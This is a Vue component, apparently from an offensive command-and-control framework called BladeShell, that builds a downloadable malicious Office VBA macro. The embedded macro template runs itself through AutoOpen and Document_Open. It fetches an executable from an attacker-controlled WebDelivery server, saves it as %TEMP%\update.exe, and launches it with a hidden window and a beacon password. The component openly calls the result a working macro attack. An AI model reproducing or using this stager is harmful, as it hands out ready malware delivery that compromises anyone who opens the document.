<template>
  <el-dialog
    v-model="visible"
    :title="isZh ? 'MS Office 宏攻击' : 'MS Office Macro Attack'"
    width="700px"
    append-to-body
    class="cs-dialog"
    :close-on-click-modal="false"
  >
    <div class="cs-dialog-body">
      <div class="cs-dialog-desc">
        {{ isZh ? '生成真实可用的 VBA 宏：AutoOpen 时经 XMLHTTP 从 WebDelivery 下载完整客户端并执行（带上线密码参数）。' : 'Generates a working VBA macro: AutoOpen downloads the full client via XMLHTTP from a WebDelivery and executes it (with the beacon password argument).' }}
      </div>

      <div class="cs-form-row">
        <label class="cs-form-label">{{ isZh ? 'WebDelivery:' : 'Web Delivery:' }}</label>
        <el-select
          v-model="form.deliveryPort"
          size="small"
          class="cs-form-input"
          :placeholder="isZh ? '选择 WebDelivery 投递' : 'Select a WebDelivery'"
          @visible-change="onDropdown"
        >
          <el-option
            v-for="wd in webDeliveryOptions"
            :key="String(field(wd, 'ListeningPort', 'listening_port'))"
            :label="wdLabel(wd)"
            :value="String(field(wd, 'ListeningPort', 'listening_port'))"
          />
        </el-select>
      </div>

      <div class="cs-form-row">
        <label class="cs-form-label">{{ isZh ? '上线密码:' : 'Pass:' }}</label>
        <el-input v-model="form.pass" size="small" :placeholder="isZh ? '客户端启动上线密码（可选）' : 'Beacon startup password (optional)'" class="cs-form-input" />
      </div>
    </div>

    <template #footer>
      <div class="cs-dialog-footer-center">
        <button class="cs-btn cs-btn-primary" :disabled="!form.deliveryPort" @click="handleGenerate">
          {{ isZh ? '生成宏代码' : 'Generate Macro' }}
        </button>
        <button class="cs-btn" @click="handleHelp">{{ isZh ? '帮助' : 'Help' }}</button>
      </div>
    </template>
  </el-dialog>
</template>

<script setup lang="ts">
import { computed, reactive, ref, watch } from 'vue'
import { ElMessage } from 'element-plus'
import { useI18nStore } from '@/stores/i18n'
import { fetchWebDeliveryOptions, wdLabel, field, hintNoWebDelivery, type WebDeliveryRow } from './payloadUtil'

const i18nStore = useI18nStore()
const isZh = computed(() => i18nStore.isZh)

const props = defineProps<{
  modelValue: boolean
}>()

const emit = defineEmits<{
  (e: 'update:modelValue', val: boolean): void
}>()

const visible = computed({
  get: () => props.modelValue,
  set: (v) => emit('update:modelValue', v),
})

const webDeliveryOptions = ref<WebDeliveryRow[]>([])

const form = reactive({
  deliveryPort: '',
  pass: '',
})

watch(
  () => props.modelValue,
  (val) => {
    if (val) {
      form.deliveryPort = ''
      onDropdown(true)
    }
  },
)

async function onDropdown(visibleState?: boolean) {
  if (visibleState === false) return
  webDeliveryOptions.value = await fetchWebDeliveryOptions()
}

async function handleGenerate() {
  if (!form.deliveryPort) {
    ElMessage.warning(isZh.value ? '请选择 WebDelivery' : 'Select a WebDelivery first')
    return
  }
  const wd = webDeliveryOptions.value.find(
    (w) => String(field(w, 'ListeningPort', 'listening_port')) === form.deliveryPort,
  )
  if (!wd) {
    hintNoWebDelivery()
    return
  }
  const serverAddress = field(wd, 'ServerAddress', 'server_address') || ''
  const pass = form.pass || 'password'
  if (!serverAddress) {
    ElMessage.warning(isZh.value ? '该投递没有公开 URL（shared 模式才有）' : 'No public URL for this delivery (shared mode required)')
    return
  }

  // 真实 VBA：AutoOpen/Document_Open 下载完整客户端到 %TEMP% 并携带上线密码执行
  const vbaCode = `' BladeShell MS Office VBA Stager
' Payload: ${serverAddress}
' Pass: ${pass}
Sub AutoOpen()
    On Error Resume Next
    Dim url As String, savePath As String
    url = "${serverAddress}"
    savePath = Environ("TEMP") & "\\update.exe"
    Dim xHttp As Object
    Set xHttp = CreateObject("MSXML2.XMLHTTP")
    xHttp.Open "GET", url, False
    xHttp.Send
    If xHttp.Status = 200 Then
        Dim bStrm As Object
        Set bStrm = CreateObject("Adodb.Stream")
        With bStrm
            .Type = 1
            .Open
            .Write xHttp.responseBody
            .SaveToFile savePath, 2
        End With
        Shell """" & savePath & """ """ & "${pass}" & """", vbHide
    End If
End Sub
Sub Document_Open()
    AutoOpen
End Sub
`
  const blob = new Blob([vbaCode], { type: 'text/plain' })
  const url = URL.createObjectURL(blob)
  const a = document.createElement('a')
  a.href = url
  a.download = 'macro.vba'
  a.click()
  URL.revokeObjectURL(url)
  ElMessage.success(isZh.value ? 'VBA 宏代码已生成（下载为 macro.vba）' : 'VBA macro generated (downloaded as macro.vba)')
  visible.value = false
}

function handleHelp() {
  ElMessage.info(isZh.value ? '宏从 WebDelivery 地址下载完整客户端到 %TEMP% 并以隐藏窗口执行，携带上线密码参数' : 'The macro downloads the full client from the WebDelivery URL to %TEMP% and runs it hidden with the beacon password argument')
}
</script>

<style scoped>
.cs-dialog-body {
  display: flex;
  flex-direction: column;
  gap: 14px;
}
.cs-dialog-desc {
  font-size: 15px;
  color: var(--cs-text-dim);
  line-height: 1.6;
}
.cs-form-row {
  display: flex;
  align-items: center;
  gap: 12px;
}
.cs-form-label {
  min-width: 130px;
  max-width: 150px;
  font-size: 15.5px;
  color: var(--cs-text);
  text-align: right;
  flex-shrink: 0;
}
.cs-form-input {
  flex: 1;
}
.cs-dialog-footer-center {
  display: flex;
  justify-content: center;
  gap: 12px;
}
</style>
